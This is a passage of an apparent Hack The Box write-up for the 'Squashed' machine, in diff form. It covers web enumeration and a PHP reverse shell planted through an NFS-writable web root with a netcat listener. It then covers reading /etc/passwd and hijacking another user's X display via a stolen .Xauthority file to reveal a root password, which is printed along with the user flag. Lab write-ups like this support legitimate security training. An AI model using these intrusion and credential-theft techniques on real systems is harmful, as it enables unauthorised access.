+</span><span class="z-text z-plain">│   ├── instagram-icon.png
+</span><span class="z-text z-plain">│   ├── left-arrow.png
+</span><span class="z-text z-plain">│   ├── linkedin-icon.png
+</span><span class="z-text z-plain">│   ├── logo.png
+</span><span class="z-text z-plain">│   ├── quote-icon.png
+</span><span class="z-text z-plain">│   ├── right-arrow.png
+</span><span class="z-text z-plain">│   ├── search-icon.png
+</span><span class="z-text z-plain">│   └── twitter-icon.png
+</span><span class="z-text z-plain">├── index.html
+</span><span class="z-text z-plain">└── js
+</span><span class="z-text z-plain">    ├── bootstrap.bundle.min.js
+</span><span class="z-text z-plain">    ├── custom.js
+</span><span class="z-text z-plain">    ├── jquery-3.0.0.min.js
+</span><span class="z-text z-plain">    ├── jquery.mCustomScrollbar.concat.min.js
+</span><span class="z-text z-plain">    ├── jquery.min.js
+</span><span class="z-text z-plain">    ├── plugin.js
+</span><span class="z-text z-plain">    └── popper.min.js
+</span></code></pre>
+<p>There's a few files, likely used by the web server on port <code>80/tcp</code>.</p>
+<p>It's probably easier to explore the web server first though.</p>
+<h2 id="apache-port-80-tcp">Apache (port <code>80/tcp</code>)</h2>
+<p>Let's browse to <code>http://10.10.11.191/</code> and see what we get.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/squashed/apache-homepage.png" alt="Apache homepage" /></p>
+<p>This looks like a website about a design company named 'Built Better'. Most of the web page content is 'Lorem ipsum' though, so we can't learn more at the moment.</p>
+<h3 id="http-headers">HTTP headers</h3>
+<p>Let's check out the HTTP response headers when we request the homepage.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl http://10.10.11.191/<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>I</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">HTTP/1.1 200 OK
+</span><span class="z-text z-plain">Date: Sun, 07 Jan 2024 09:39:55 GMT
+</span><span class="z-text z-plain">Server: Apache/2.4.41 (Ubuntu)
+</span><span class="z-text z-plain">Last-Modified: Tue, 27 Dec 2022 15:35:01 GMT
+</span><span class="z-text z-plain">ETag: &quot;7f14-5f0d0fec87768&quot;
+</span><span class="z-text z-plain">Accept-Ranges: bytes
+</span><span class="z-text z-plain">Content-Length: 32532
+</span><span class="z-text z-plain">Vary: Accept-Encoding
+</span><span class="z-text z-plain">Content-Type: text/html
+</span></code></pre>
+<p>The <code>Server</code> confirms confirms what we already discovered: Squashed is running Apache version <code>2.4.41</code>.</p>
+<h3 id="technology-lookup">Technology lookup</h3>
+<p>While we're at it, let's look up the technologies used by this website with the <a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/squashed/apache-homepage-wappalyzer.png" alt="Apache homepage Wappalyzer extension" /></p>
+<p>So it confirms what we already discovered, but it also reveals that this website is using Bootstrap and libraries like jQuery.</p>
+<h3 id="exploration">Exploration</h3>
+<p>I tried to browse the website, but the navbar links are not set. Same for the 'Login' button and the search functionality.</p>
+<p>I also tried to fill the contact form and the newsletter subscription form, but they're not set either.</p>
+<h3 id="site-crawling">Site crawling</h3>
+<p>Let's crawl the website to see if I there's interesting linked web pages.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> katana<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> http://10.10.11.191/</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[INF] Started standard crawling for =&gt; http://10.10.11.191/
+</span><span class="z-text z-plain">http://10.10.11.191/
+</span><span class="z-text z-plain">http://10.10.11.191/js/custom.js
+</span><span class="z-text z-plain">http://10.10.11.191/js/owl.carousel.js
+</span><span class="z-text z-plain">http://10.10.11.191/js/jquery-3.0.0.min.js
+</span><span class="z-text z-plain">http://10.10.11.191/js/popper.min.js
+</span><span class="z-text z-plain">http://10.10.11.191/js/jquery.mCustomScrollbar.concat.min.js
+</span><span class="z-text z-plain">http://10.10.11.191/js/jquery.min.js
+</span><span class="z-text z-plain">http://10.10.11.191/js/bootstrap.bundle.min.js
+</span><span class="z-text z-plain">http://10.10.11.191/css/owl.carousel.min.css
+</span><span class="z-text z-plain">http://10.10.11.191/css/owl.theme.default.min.css
+</span><span class="z-text z-plain">http://10.10.11.191/css/jquery.mCustomScrollbar.min.css
+</span><span class="z-text z-plain">http://10.10.11.191/css/responsive.css
+</span><span class="z-text z-plain">http://10.10.11.191/css/style.css
+</span><span class="z-text z-plain">http://10.10.11.191/index.html
+</span><span class="z-text z-plain">http://10.10.11.191/css/bootstrap.min.css
+</span><span class="z-text z-plain">http://10.10.11.191/js/plugin.js
+</span></code></pre>
+<p>The <code>custom.js</code> file could be interesting... but I checked it, and it isn't.</p>
+<h3 id="directory-fuzzing">Directory fuzzing</h3>
+<p>Let's see if this website hides unliked web pages and directories.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ffuf<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> http://10.10.11.191/FUZZ<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> .php</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 25ms]
+</span><span class="z-text z-plain">| URL | http://10.10.11.191/css
+</span><span class="z-text z-plain">| --&gt; | http://10.10.11.191/css/
+</span><span class="z-text z-plain">    * FUZZ: css
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 2486ms]
+</span><span class="z-text z-plain">| URL | http://10.10.11.191/images
+</span><span class="z-text z-plain">| --&gt; | http://10.10.11.191/images/
+</span><span class="z-text z-plain">    * FUZZ: images
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://10.10.11.191/js
+</span><span class="z-text z-plain">| --&gt; | http://10.10.11.191/js/
+</span><span class="z-text z-plain">    * FUZZ: js
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | http://10.10.11.191/.php
+</span><span class="z-text z-plain">    * FUZZ: .php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 32532, Words: 13031, Lines: 581, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://10.10.11.191/
+</span><span class="z-text z-plain">    * FUZZ: 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://10.10.11.191/server-status
+</span><span class="z-text z-plain">    * FUZZ: server-status
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>We find nothing interesting, except that PHP files are probably executed.</p>
+<h1 id="foothold-rce">Foothold (RCE)</h1>
+<p>Let's not waste too much time trying to find new functionalities on the web server. We discovered <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#exploring-var-www-html">previously</a> that we have access to a <code>/var/www/html</code> folder, probably used by the Apache web server. If this is the case, we could upload our own PHP files and get RCE this way!</p>
+<h2 id="check">Check</h2>
+<p>First, let's check if the source code we found really corresponds to the web server's source code.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /workspace/nfs/html/index.html</span>
+</span></code></pre>
+<pre data-lang="html" class="language-html z-code"><code class="language-html" data-lang="html"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span><span class="z-text z-html z-basic"><span class="z-meta z-tag z-inline z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span><span class="z-entity z-name z-tag z-inline z-any z-html">title</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>Built Better<span class="z-meta z-tag z-inline z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;/</span><span class="z-entity z-name z-tag z-inline z-any z-html">title</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></code></pre>
+<p>It has the same title. If we look the source code of the Apache homepage and compare it with the one we found, we see that they are the same! It's safe to assume that we really got access to the source code of the web server.</p>
+<h2 id="preparation">Preparation</h2>
+<p>Our goal is to obtain a reverse shell.</p>
+<p>First, I'll setup a listener on port <code>9001</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> 9001</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">listening on [any] 9001 ...
+</span></code></pre>
+<p>Now, let's create the PHP file to get the reverse shell. I'm going to use the 'PHP Ivan Sincek' one from <a href="https://www.revshells.com/">this website</a>, configured to use a <code>sh</code> shell. The payload is more than 100 lines long, so I won't include it here.</p>
+<p>I'll save it in <code>/workspace/nfs/html</code> as <code>revshell.php</code>.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>The PHP file should now be present on the web server. We only need to execute it by browsing to it!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl http://10.10.11.191/revshell.php<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.30] from (UNKNOWN) [10.10.11.191] 43466
+</span><span class="z-text z-plain">SOCKET: Shell has connected! PID: 2114
+</span></code></pre>
+<p>It worked!</p>
+<p>This shell is quite limited though, so let's execute a Python one-liner to transform it into an interactive one:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">python3</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>import pty; pty.spawn(&quot;/bin/bash&quot;)<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">alex@squashed:/var/www/html$
+</span></code></pre>
+<p>That's better!</p>
+<h1 id="local-enumeration">Local enumeration</h1>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>alex</code>.</p>
+<h2 id="distribution">Distribution</h2>
+<p>Let's see which distribution Squashed is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">alex@squashed:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> lsb_release<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">No LSB modules are available.
+</span><span class="z-text z-plain">Distributor ID: Ubuntu
+</span><span class="z-text z-plain">Description:    Ubuntu 20.04.5 LTS
+</span><span class="z-text z-plain">Release:        20.04
+</span><span class="z-text z-plain">Codename:       focal
+</span></code></pre>
+<p>So this is Ubuntu 20.04.3, okay. That's pretty recent, so we're unlikely to find vulnerabilities here.</p>
+<h2 id="architecture">Architecture</h2>
+<p>What is Squashed's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">alex@squashed:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">x86_64
+</span></code></pre>
+<p>So this system is using x64. This will be useful to know if we want to compile our own exploits.</p>
+<h2 id="kernel">Kernel</h2>
+<p>Maybe Squashed is vulnerable to a kernel exploit?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">alex@squashed:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">5.4.0-131-generic
+</span></code></pre>
+<p>Unfortunately, the kernel version is recent too.</p>
+<h2 id="apparmor">AppArmor</h2>
+<p>Let's list the applications AppArmor profiles:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">alex@squashed:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lap</span> /etc/apparmor.d/</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>/<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">-rw-r--r--   1 root root   896 Nov  5  2021 lightdm-guest-session
+</span><span class="z-text z-plain">-rw-r--r--   1 root root  1313 Apr 12  2020 lsb_release
+</span><span class="z-text z-plain">-rw-r--r--   1 root root  1108 Apr 12  2020 nvidia_modprobe
+</span><span class="z-text z-plain">-rw-r--r--   1 root root  3461 Jun 21  2022 sbin.dhclient
+</span><span class="z-text z-plain">-rw-r--r--   1 root root  3202 Feb 25  2020 usr.bin.man
+</span><span class="z-text z-plain">-rw-r--r--   1 root root 28376 May 11  2022 usr.lib.snapd.snap-confine.real
+</span><span class="z-text z-plain">-rw-r--r--   1 root root   540 Apr 10  2020 usr.sbin.cups-browsed
+</span><span class="z-text z-plain">-rw-r--r--   1 root root  5797 May 27  2022 usr.sbin.cupsd
+</span><span class="z-text z-plain">-rw-r--r--   1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
+</span><span class="z-text z-plain">-rw-r--r--   1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
+</span><span class="z-text z-plain">-rw-r--r--   1 root root  1385 Dec  7  2019 usr.sbin.tcpdump
+</span></code></pre>
+<p>All of these profiles are classic.</p>
+<h2 id="nics">NICs</h2>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">alex@squashed:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ip a</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+</span><span class="z-text z-plain">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span><span class="z-text z-plain">    inet 127.0.0.1/8 scope host lo
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">    inet6 ::1/128 scope host 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+</span><span class="z-text z-plain">    link/ether 00:50:56:b9:56:32 brd ff:ff:ff:ff:ff:ff
+</span><span class="z-text z-plain">    inet 10.10.11.191/23 brd 10.10.11.255 scope global ens160
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">    inet6 dead:beef::250:56ff:feb9:5632/64 scope global dynamic mngtmpaddr 
+</span><span class="z-text z-plain">       valid_lft 86393sec preferred_lft 14393sec
+</span><span class="z-text z-plain">    inet6 fe80::250:56ff:feb9:5632/64 scope link 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span></code></pre>
+<p>So there's only the loopback interface and the Ethernet interface.</p>
+<h2 id="hostname">Hostname</h2>
+<p>What is Squashed's hostname?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">alex@squashed:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">squashed.htb
+</span></code></pre>
+<p>Yeah I know, very surprising.</p>
+<h2 id="local-users">Local users</h2>
+<p>Let's enumerate all the local users that have a console.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">alex@squashed:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /etc/passwd</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span>:<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f1</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root
+</span><span class="z-text z-plain">alex
+</span><span class="z-text z-plain">ross
+</span></code></pre>
+<p>So there's <code>alex</code> (us), but also <code>ross</code> and <code>root</code>.</p>
+<h2 id="local-groups">Local groups</h2>
+<p>Let's retrieve the list of all local groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">alex@squashed:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> getent group</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span>:<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f1</span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">adm
+</span><span class="z-text z-plain">alex
+</span><span class="z-text z-plain">audio
+</span><span class="z-text z-plain">avahi
+</span><span class="z-text z-plain">backup
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">bluetooth
+</span><span class="z-text z-plain">cdrom
+</span><span class="z-text z-plain">colord
+</span><span class="z-text z-plain">crontab
+</span><span class="z-text z-plain">daemon
+</span><span class="z-text z-plain">dialout
+</span><span class="z-text z-plain">dip
+</span><span class="z-text z-plain">disk
+</span><span class="z-text z-plain">fax
+</span><span class="z-text z-plain">floppy
+</span><span class="z-text z-plain">fwupd-refresh
+</span><span class="z-text z-plain">games
+</span><span class="z-text z-plain">geoclue
+</span><span class="z-text z-plain">gnats
+</span><span class="z-text z-plain">input
+</span><span class="z-text z-plain">irc
+</span><span class="z-text z-plain">kmem
+</span><span class="z-text z-plain">kvm
+</span><span class="z-text z-plain">landscape
+</span><span class="z-text z-plain">lightdm
+</span><span class="z-text z-plain">list
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">lpadmin
+</span><span class="z-text z-plain">lxd
+</span><span class="z-text z-plain">mail
+</span><span class="z-text z-plain">man
+</span><span class="z-text z-plain">messagebus
+</span><span class="z-text z-plain">netdev
+</span><span class="z-text z-plain">news
+</span><span class="z-text z-plain">nogroup
+</span><span class="z-text z-plain">nopasswdlogin
+</span><span class="z-text z-plain">operator
+</span><span class="z-text z-plain">plugdev
+</span><span class="z-text z-plain">proxy
+</span><span class="z-text z-plain">pulse
+</span><span class="z-text z-plain">pulse-access
+</span><span class="z-text z-plain">render
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">ross
+</span><span class="z-text z-plain">rtkit
+</span><span class="z-text z-plain">saned
+</span><span class="z-text z-plain">sasl
+</span><span class="z-text z-plain">scanner
+</span><span class="z-text z-plain">shadow
+</span><span class="z-text z-plain">src
+</span><span class="z-text z-plain">ssh
+</span><span class="z-text z-plain">ssl-cert
+</span><span class="z-text z-plain">staff
+</span><span class="z-text z-plain">sudo
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">syslog
+</span><span class="z-text z-plain">systemd-coredump
+</span><span class="z-text z-plain">systemd-journal
+</span><span class="z-text z-plain">systemd-network
+</span><span class="z-text z-plain">systemd-resolve
+</span><span class="z-text z-plain">systemd-timesync
+</span><span class="z-text z-plain">tape
+</span><span class="z-text z-plain">tcpdump
+</span><span class="z-text z-plain">tss
+</span><span class="z-text z-plain">tty
+</span><span class="z-text z-plain">users
+</span><span class="z-text z-plain">utmp
+</span><span class="z-text z-plain">uucp
+</span><span class="z-text z-plain">uuidd
+</span><span class="z-text z-plain">video
+</span><span class="z-text z-plain">voice
+</span><span class="z-text z-plain">www-data
+</span></code></pre>
+<p>The <code>lxd</code> group is interesting to elevate privileges.</p>
+<h2 id="user-account-information">User account information</h2>
+<p>Let's see to which groups we currently belong.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">alex</span></span>
+</span></code></pre>
+<p>Unfortunately we don't belong to the <code>lxd</code> group, but to the default group for our user.</p>
+<h2 id="home-folder">Home folder</h2>
+<p>If we check our home folder, we find the user flag. Let's retrieve its content:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">alex@squashed:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>/user.txt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">d552fc7e1aa8aac1a9ad35bec57f1641
+</span></code></pre>
+<h2 id="displays">Displays</h2>
+<p>Before continuing our enumeration of the box and falling in rabbit holes, let's check if we can access <code>ross</code>'s display using the <code>.Xauthority</code> file we discovered <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#enumerating-xauthority">earlier</a>.</p>
+<p>First, we need to find the list of connected displays.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">alex@squashed:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> w</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class="z-text z-plain">ross     tty7     :0               09:36   50:55   7.25s  0.05s /usr/libexec/gnome-session-binary --systemd --session=gnome
+</span></code></pre>
+<p>As we suspected, the <code>ross</code> user is connected and using the display <code>:0</code>.</p>
+<h2 id="ross-s-display-screenshot"><code>ross</code>'s display screenshot</h2>
+<p>Let's transfer the <code>.Xauthority</code> file to the machine.</p>
+<p>Once this is done, we should be able to use it to take a screenshot of <code>ross</code>'s display</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">alex@squashed:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> XAUTHORITY=/tmp/.Xauthority xwd<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>root</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>screen</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>silent</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> :0<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>out</span> /tmp/screenshot.xwd</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Now let's transfer it to our machine.</p>
+<p>There's still one small issue: the file is in the XWD format, so we can't really read it. We have to conver it first.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> convert /workspace/screenshot.xwd /workspace/screenshot.png</span>
+</span></code></pre>
+<p>Now let's open it.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/squashed/ross-display-keepassxc.png" alt="'ross''s display with KeepassXC open" /></p>
+<p>So <code>ross</code> has KeepassXC open. It's probably the <code>Passwords.kdbx</code> database we found <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#enumerating-passwords-kdbx">earlier</a>!</p>
+<p>We see that it contains a single entry named 'System'. Fortunately, the username <code>root</code> and the password <code>cah$mei7rai9A</code> are visible!</p>
+<h1 id="privilege-escalation-root-impersonation">Privilege escalation (<code>root</code> impersonation)</h1>
+<p>We discovered in the <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#tcp-port-scanning">TCP port scanning</a> section that Squashed accepts connections over SSH. Let's try these credentials to connect as <code>root</code>!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh root@10.10.11.191</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">The authenticity of host &#39;10.10.11.191 (10.10.11.191)&#39; can&#39;t be established.
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span class="z-text z-plain">Warning: Permanently added &#39;10.10.11.191&#39; (ED25519) to the list of known hosts.
+</span><span class="z-text z-plain">root@10.10.11.191&#39;s password:
